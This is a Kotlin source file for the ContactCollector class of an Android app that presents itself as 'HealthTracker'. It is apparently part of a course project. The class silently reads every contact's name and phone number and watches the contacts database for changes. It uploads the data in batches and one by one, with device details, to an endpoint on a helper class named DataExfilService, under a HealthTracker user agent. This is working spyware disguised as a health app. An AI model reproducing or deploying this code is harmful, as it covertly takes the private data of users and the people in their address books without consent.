package com.inf2007.healthtracker.utilities.collectors

import android.content.ContentResolver
import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.util.Log
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.DeviceUtils
import com.inf2007.healthtracker.utilities.NetworkClient
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException

class ContactCollector(private val context: Context) : DataCollector {
    companion object {
        private const val TAG = "ContactCollector"
    }

    private val contactsSyncPrefs by lazy {
        context.getSharedPreferences("contacts_sync_log", Context.MODE_PRIVATE)
    }

    private var contactsObserver: ContentObserver? = null
    private var isFirstScan = true

    override fun startObserving() {
        // Contacts are monitored via ContentObserver in DataExfilService
        // This just triggers initial collection
        collect()
        Log.d(TAG, "Contact collector ready")
    }

    override fun stopObserving() {
        // Nothing to clean up - ContentObserver is managed by DataExfilService
        Log.d(TAG, "Contact collector stopped")
    }

    override fun collect() {
        scanAndUploadContacts()
    }

    fun scanAndUploadContacts() {
        if (!hasContactsPermission()) {
            Log.d(TAG, "No contacts permission, skipping scan")
            return
        }

        Log.d(TAG, "Starting contacts scan...")

        val projection = arrayOf(
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER
        )

        context.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            null,
            null,
            null
        )?.use { cursor ->
            val totalContacts = cursor.count
            Log.d(TAG, "Contacts Scan: $totalContacts contacts found")

            val idColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
            val hasPhoneColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)

            // If this is the first scan, we need to collect ALL contacts for batching
            if (isFirstScan) {
                val contactsList = mutableListOf<JSONObject>()
                val contactIds = mutableListOf<String>()

                while (cursor.moveToNext()) {
                    val contactId = cursor.getString(idColumn)
                    val name = cursor.getString(nameColumn) ?: "Unnamed"
                    val hasPhone = cursor.getInt(hasPhoneColumn)

                    var phoneNumber = "No number found"
                    if (hasPhone > 0) {
                        phoneNumber = getPhoneNumberForContact(contactId)
                    }

                    val contactJson = JSONObject().apply {
                        put("contact_id", contactId)
                        put("contact_name", name)
                        put("phone_number", phoneNumber)
                    }

                    contactsList.add(contactJson)
                    contactIds.add(contactId)
                }

                // Upload as batch
                uploadContactsBatch(contactsList, contactIds)
                isFirstScan = false
            } else {
                // Normal incremental scan
                var uploadCount = 0
                while (cursor.moveToNext()) {
                    val contactId = cursor.getString(idColumn)
                    val name = cursor.getString(nameColumn) ?: "Unnamed"
                    val hasPhone = cursor.getInt(hasPhoneColumn)

                    if (!contactsSyncPrefs.getBoolean("contact_$contactId", false)) {
                        var phoneNumber = "No number found"

                        if (hasPhone > 0) {
                            phoneNumber = getPhoneNumberForContact(contactId)
                        }

                        uploadContactToServer(contactId, name, phoneNumber)
                        contactsSyncPrefs.edit().putBoolean("contact_$contactId", true).apply()
                        uploadCount++
                    }
                }
                Log.d(TAG, "Contacts Scan Complete: $uploadCount new contacts uploaded")
            }
        }
    }


    private fun getPhoneNumberForContact(contactId: String): String {
        var phoneNumber = "No number found"

        context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
            arrayOf(contactId),
            null
        )?.use { phoneCursor ->
            if (phoneCursor.moveToFirst()) {
                val numberColumn = phoneCursor.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                phoneNumber = phoneCursor.getString(numberColumn)
            }
        }

        return phoneNumber
    }

    private fun uploadContactToServer(contactId: String, contactName: String, phoneNumber: String) {
        try {
            val ipAddress = DeviceUtils.getUniqueDeviceId(context)

            val contactData = JSONObject().apply {
                put("type", "contact")
                put("device_ip", ipAddress)
                put("device_model", android.os.Build.MODEL)
                put("android_version", android.os.Build.VERSION.RELEASE)
                put("timestamp", System.currentTimeMillis())
                put("app_package", context.packageName)
                put("contact_id", contactId)
                put("contact_name", contactName)
                put("phone_number", phoneNumber)
            }

            val requestBody = contactData.toString()
                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(DataExfilService.CONTACTS_ENDPOINT)
                .post(requestBody)
                .addHeader("User-Agent", "HealthTracker/1.0")
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Contact upload failed: $contactName - ${e.message}")
                    contactsSyncPrefs.edit().remove("contact_$contactId").apply()
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Contact uploaded: $contactName -> $phoneNumber")
                    } else {
                        Log.w(TAG, "Contact upload failed: HTTP ${response.code}")
                        contactsSyncPrefs.edit().remove("contact_$contactId").apply()
                    }
                    response.close()
                }
            })

        } catch (e: Exception) {
            Log.e(TAG, "Error uploading contact: ${e.message}")
            contactsSyncPrefs.edit().remove("contact_$contactId").apply()
        }
    }

    private fun hasContactsPermission(): Boolean {
        return context.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    fun setupObservers(contentResolver: ContentResolver) {
        contactsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                Log.d(TAG, "Contacts database changed: $uri")
                scanAndUploadContacts()
            }
        }

        contentResolver.registerContentObserver(
            ContactsContract.Contacts.CONTENT_URI,
            true,
            contactsObserver!!
        )

        Log.d(TAG, "Contacts observer registered")
    }

    fun removeObservers(contentResolver: ContentResolver) {
        try {
            contactsObserver?.let { contentResolver.unregisterContentObserver(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error removing contacts observer: ${e.message}")
        }
    }

    private fun uploadContactsBatch(contactsList: List<JSONObject>, contactIds: List<String>) {
        val ipAddress = DeviceUtils.getUniqueDeviceId(context)
        val batchData = JSONObject().apply {
            put("type", "contacts_batch")
            put("device_ip", ipAddress)
            put("device_model", android.os.Build.MODEL)
            put("android_version", android.os.Build.VERSION.RELEASE)
            put("timestamp", System.currentTimeMillis())
            put("app_package", context.packageName)
            put("total_contacts", contactsList.size)
            put("contacts", JSONArray(contactsList))
        }

        try {
            val requestBody = batchData.toString()
                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(DataExfilService.CONTACTS_ENDPOINT)
                .post(requestBody)
                .addHeader("User-Agent", "HealthTracker/1.0")
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Initial contacts batch upload failed: ${e.message}")
                    // Fall back to individual uploads by not marking them as synced
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.i(TAG, "Initial contacts batch uploaded successfully: ${contactsList.size} contacts")
                        // Mark all as synced
                        contactIds.forEach { contactId ->
                            contactsSyncPrefs.edit().putBoolean("contact_$contactId", true).apply()
                        }
                    } else {
                        Log.w(TAG, "Initial contacts batch failed: HTTP ${response.code}")
                        // Don't mark as synced, they'll be uploaded individually later
                    }
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading contacts batch: ${e.message}")
        }
    }
}